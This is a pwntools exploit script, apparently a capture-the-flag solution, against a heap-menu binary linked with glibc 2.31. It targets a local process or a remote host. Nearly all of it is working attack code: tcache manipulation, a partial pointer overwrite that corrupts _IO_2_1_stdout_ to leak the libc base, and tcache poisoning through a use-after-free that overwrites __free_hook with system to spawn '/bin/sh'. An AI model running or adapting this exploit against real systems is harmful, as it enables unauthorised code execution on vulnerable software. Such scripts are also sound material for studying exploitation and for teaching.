from pwn import *
context.arch = 'amd64'
context.log_level = "debug"
IP = "172.20.2.7"
PORT = 26351
DEBUG = 1


if DEBUG:
    p = process(["./ld-2.31.so", "./pwn"], env={"LD_PRELOAD": "./libc-2.31.so"})
    # attention: argv[1] for ./pwn when running with ./ld.so ./pwn
    base = p.libs()[p._cwd + p.argv[1].decode().strip('.')]  # fix bytes str error in py3.9
    print("base:", base, p.libs())
    libc = ELF("./libc-2.31.so")
else:
    p = remote(IP, PORT)
    libc = ELF("./libc-2.31.so")


def ru(x): return p.recvuntil(x)
def se(x): return p.send(x)
def rl(): return p.recvline()
def sl(x): return p.sendline(x)
def rv(x): return p.recv(x)
def sa(a, b): return p.sendafter(a, b)
def sla(a, b): return p.sendlineafter(a, b)
def l64(): return u64(p.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))  # python 3.9 pass


def debug(cmd=""):
    gdb.attach(p, cmd)


def cmd(idx):
    sla("Todo:\n", str(idx))


def add(idx, size, content):
    cmd(1)
    sla("\n", str(idx))
    sla("\n", str(size))
    sla("\n", content)


def edit(idx, content):
    cmd(2)
    sla("\n", str(idx))
    sla("\n", content)


def talk(idx):
    cmd(3)
    sla("\n", str(idx))
    ru("Baby said: ! @ # $ % ^ & * ( ")
    B0 = ru("\n")[-2]
    ru("Continued the baby: ! @ # $ % ^ & * ( ")
    B1 = ru("\n")[-2]
    return int(B0), int(B1)


def free(idx):
    cmd(4)
    sla("\n", str(idx))


def dd():
    if DEBUG:
        cmd = ""
        cmd += "b *%d\n" % (base + 0x198E)  # call menu_sub
        cmd += "set $a=%d\n" % (base + 0x4080)  # _QWORD *arrPtr[] # x /10xg $a : ptr array
        debug(cmd)


# === Step-1: malloc 8 chunks, full tcache(cnt=7), 1 to unsorted bin
for i in range(8):  # c7: avoid top chunk merging
    add(i, 0xa0, "ILoveC")  # heap chunks: c0, c1, c2, ... c7, top_chunk
for i in range(7):  # 0 ~ 6
    free(i)   # full tcache # tcache(0xb0) cnt=7: c6, c5, ...,c0
edit(6, "B" * 16)  # double free prepare, cover fw/bk of c6, avoid "free(): double free detected in tcache 2"
free(6)  # c6 to unsorted bin
# heap bins: tcache(0xb0) cnt=7: c6, libc addr, trash addr... unsorted: c6


# == Steo-2: leak 2nd byte of c6 fw/bk
B0, B1 = talk(6)
randnum = B0 ^ 0xe0  # 0xe0: lowest Byte of c6'fw/bk
# p &_IO_2_1_stdout_
B1 = randnum ^ B1
stdout_ls2B = b"\xa0" + int(B1 + 0xa + 1).to_bytes(1, "big")  # &_IO_2_1_stdout_ - c6_fw = 0xac0
print("==> B0,B1:", bytes([B0, B1]).hex(), "rand:", hex(randnum), "stdout_ls2B", stdout_ls2B.hex())


# === Step-3: cover c6_fw with &_IO_2_1_stdout_ (only lowest 2B)
cmd(2)  # edit
sla("\n", str(6))  # idx=6
sa("\n", stdout_ls2B)  # cover lowest 2B # verify: &_IO_2_1_stdout_ == c6_fw != c6_bk

# heap bins: tcache(0xb0) cnt=7: c6, &_IO_2_1_stdout_, Corrupted... unsorted: c6
# === Step-4: leak libc_base by changing _flag etc of _IO_2_1_stdout_
add(6, 0xa0, "deadbeef")  # tcache(0xb0) cnt=6: &_IO_2_1_stdout_, Corrupted... # c6_fw=deadbeef, c6_bk=0xa(\n)
cmd(1)  # malloc
sla("\n", str(5))  # idx=5
sla("\n", str(0xa0))  # size=0xa0
sa("\n", p64(0xfbad3887) + p64(0) + p64(0) + p64(0) + b'\x00')  # c5/_IO_2_1_stdout_ : x /10xg 0x00007f055b0446a0
# 0x7f055b0446a0 <_IO_2_1_stdout_>:       0x00000000fbad3887      0x00007f055b044723
# 0x7f055b0446b0 <_IO_2_1_stdout_+16>:    0x00007f055b044723      0x00007f055b044723
# 0x7f055b0446c0 <_IO_2_1_stdout_+32>:    0x00007f055b044723      0x00007f055b044723
leak_addr = l64()
libc_base = leak_addr - 0x1eb980  # cal offset between leak_addr and libc_base (vmmap in gdb)
print("==> leak_addr:", hex(leak_addr), "libc:", hex(libc_base))

# heap bins: tcache(0xb0) cnt=5: Corrupted chunk at 0xfbad2887 unsorted: c6
# === Step-5: recover c6_fw/bk. if not, SIGSEGV occur in Step-6
c6fw = 0x1ebbe0 + libc_base
cmd(2)  # edit
sla("\n", str(6))  # idx=6
sa("\n", p64(c6fw) + p64(c6fw))  # recover c6_fw/bk

# === Step-6: tcache poisoning: UAF
free_hook = libc.symbols["__free_hook"] + libc_base
system_addr = libc.symbols["system"] + libc_base  # puts for local test # system
add(0, 0x20, "c0")  # './ld-2.31.so' stopped with exit code -11 (SIGSEGV) here if without Step-5
add(1, 0x20, "c1")
free(0)
free(1)  # tcache(0x30) cnt=2: c1, c0
edit(1, p64(free_hook))      # tcache(0x30) cnt=2: c1, &__free_hook
add(1, 0x20, "/bin/sh\x00")  # tcache(0x30) cnt=1: &__free_hook # c0:/bin/sh
add(0, 0x20, p64(system_addr))  # get &__free_hook and cover __free_hook to __free_hook
free(1)  # trriger system("/bin/sh\x00")

dd()  # debug
p.interactive()
